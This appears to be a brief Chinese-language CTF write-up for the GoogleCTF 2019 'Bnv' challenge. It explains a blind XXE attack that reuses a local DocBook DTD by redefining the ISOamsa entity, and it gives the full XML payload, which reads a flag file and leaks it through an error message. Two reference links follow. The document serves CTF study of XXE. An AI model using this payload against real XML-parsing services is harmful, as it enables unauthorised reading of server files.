# GoogleCTF2019 Quals

## Bnv

Blind-XXE 引用本地DTD

Payload:

利用 ISOamsa

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamsa '
        <!ENTITY &#x25; file SYSTEM "file:///flag">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
'>
    %local_dtd;
]
```

## 参考资料

Blind-XXE与Google CTF 2019-BNV：

http://saltyfishyu.xmutsec.com/index.php/2019/07/14/50.html

XXE 的一些Payload

https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html